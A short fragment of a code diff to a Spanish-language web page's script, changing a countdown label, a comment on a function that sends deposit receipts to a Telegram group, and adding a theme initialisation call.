+            <span class="text-slate-400 font-mono text-sub">Conteo en vivo:</span>
             <span class="font-mono font-bold text-sky-800 text-sm">${h}h ${m}m ${s}s</span>
           </div>
         `;
@@ -808,7 +888,7 @@
 
     window.setDepositValue = (v) => document.getElementById('deposit-custom-input').value = v;
 
-    // ENVÍO DE COMPROBANTES VINCULADO AL NUEVO GRUPO/CANAL
+    // ENVÍO DE COMPROBANTES VINCULADO AL GRUPO DE TELEGRAM
     window.notifyDepositTelegram = function() {
       const val = parseFloat(document.getElementById('deposit-custom-input').value) || 2000;
       if (val < 2000) {
@@ -947,6 +1027,8 @@
       renderPlans();
     }
 
+    // Inicializar tema y sesión
+    applyTheme();
     checkAuth();
     renderProducts();
   </script>
